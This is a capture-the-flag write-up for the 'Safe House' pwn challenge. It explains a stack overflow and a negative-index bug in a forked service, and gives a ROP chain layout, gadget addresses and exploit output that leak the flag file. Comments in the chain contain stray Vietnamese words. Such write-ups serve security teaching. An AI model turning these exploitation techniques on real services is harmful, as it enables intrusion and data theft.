# Safe House - Pwn (Hard)

**Flag:** `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}` · author Oreomeister
**Target:** `nc chal.sunshinectf.games 26007` · **Files:** `service` (18504 B, sha256 `40c8993c1a853f62...`)

## Challenge

"The safe house takes reports and keeps notes for the field. Get past the front desk to reach the vault." A single flag.

## Analysis

x86-64 ELF, no PIE, NX, no canary in the functions that enter the ROP chain, GNU_RELRO covering all of `.got` (the GOT is not writable), stripped. The service is two processes talking over a socketpair; only the parent process receives input from us.

## Architecture

`main @ 0x401290`:

1. `socketpair(AF_UNIX, SOCK_STREAM, 0, sv)`.
2. `key = prng(getpid())` (constant `0x45d9f3b`, two xor-shift steps) written at `0x405060`. That is the XOR key of every parent↔child message, different on each connection but fixed within one process.
3. `fork()`:
   - Parent = front desk: `dup2(sv[0], 3)`, installs seccomp (`PR_SET_NO_NEW_PRIVS` + `seccomp(2)`, 21 BPF statements), then a command loop reading one byte at a time from stdin up to `\n` into a 1024-byte buffer, matching on 4 bytes: `PING HELP NOTE RELAY SUBMIT QUIT`.
   - Child = vault: `dup2(sv[1], 3)`; `open("/dev/null")` then `dup2` onto fds 0 and 1; `signal(SIGPIPE, SIG_IGN)`; `open("flag.txt")` and storing `{state=2, fd}` in the table at `0x405080`, each entry 0x40c bytes; the later entries point at `/dev/null`. The vault has no seccomp.
4. `0x401be0(buf, len, edx=key)` = XOR with the 4 key bytes taken in big-endian order, repeating with period 4.
5. `0x401d50(edi=channel, rsi=data, edx=len)` = builds the header `[channel][len_be16][0]`, XORs it, `write(3, header, 4)`, then copies/XORs/`write(3, payload, len)`. This function is usable from both sides because it only touches fd 3.

Front desk commands: `NOTE <0..7> <text>` (table at `0x40a180`, each entry 0x40, `strncpy` up to 0x3f), `RELAY <1..4>` → `0x401f70`, `SUBMIT <size>` → `0x401ed0`.

AF_UNIX `SOCK_STREAM` is a plain byte stream that keeps no record boundaries, so `read(3, buf, n)` picks up both the header and the payload of the reply.

## Vulnerabilities

**1. Stack overflow at the front desk (`0x401ed0`, the `SUBMIT` handler)**

```
strtol(size); bl = size & 0xff
if (bl) { write(1,"GO\n",3); read(0, rsp, bl); write(1,"OK\n",3); }
add rsp,0x40; pop rbx; ret
```

The frame `sub rsp,0x40` = 64 bytes, the return address sits at offset 0x48, `read` takes up to 255 bytes, no canary. The ROP chain requires `pop rdx`, but `.text` only contains `pop rdi` and `pop rsi`. There is no `pop rdx`, `syscall`, or stack-pivot gadget. NX and GNU_RELRO are enabled, preventing shellcode execution and GOT overwrites.

**2. Negative index in the vault (`0x4019c0`, op 3)**

```
if (len <= 3) -> "short"
idx = *(int32*)data            // movsxd, SIGNED
if (idx > 15) -> "range"       // upper bound check only
e = 0x4060b0 + idx*0x40c
if (e.state == 2) { pread(e.fd, buf, 0x400, 0); return to fd 3 }
```

`0x4060b0` is exactly the entry at index 4 (zero-based) of the fd table, so `idx = -4` points precisely at `0x405080` = the fd of `flag.txt`. To leak the flag, `rdx` (length parameter) needs to be controlled during the ROP chain execution.

## Solution

**Step 1 - the gadget lives in the error branch.** When `size & 0xff == 0`, the handler prints `"ERR bad size\n"` (`mov edx,0xd`) and then returns, never passing through `read` and never through `OK\n` → `rdx = 13` at the ret. The string `"256"` placed in a NOTE gives exactly `bl = 0`.

**Step 2 - staging the data.** `NOTE 0 = int32(-4)` (contains no 0 byte so `strncpy` copies it in full), `NOTE 3 = "256"`.

**Step 3 - the ROP chain.** Each round is a `SUBMIT 255` with a payload of exactly 255 bytes (`bl` is both `rdx` and the number of bytes `read` pulls into the payload, so the payload must equal `bl` exactly):

```
pad(0x48)
pop rdi -> NOTE3("256") ; 0x401ed0                 # rdx = 13
[vòng đầu] pop rdi=3 ; pop rsi=NOTE0 ; 0x401d50    # gửi op=3, len=13, data=int32(-4)
pop rdi=3 ; pop rsi=REPLY ; read@plt               # read(3, REPLY, 13)
pop rdi=1 ; pop rsi=REPLY ; write@plt              # write(1, REPLY, 13) -> dump out to our socket
0x4014d0                                           # quay lại prompt
```

Round 1 pulls 13 bytes, the following rounds keep pulling; 4 rounds are enough for the 4-byte header + 40-byte payload.

**Step 4 - decrypting offline.** Plaintext header = `[00][L>>8][L&0xff][00]`, so for each offset and each trial `L` one gets `key = ct ^ plaintext_suy_đoán`, then the remainder is decrypted and searched for `sun{`. No need to know the PID.

```
$ python -u exploit4.py -4
[+] key=23b2f0a0  L=40
[+] b'sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n'
[+] CO: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```

**Step 5 - Verification.** Re-ran 3 times over 3 different connections, 3 completely different keys, the same flag.

## Result
```
sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```
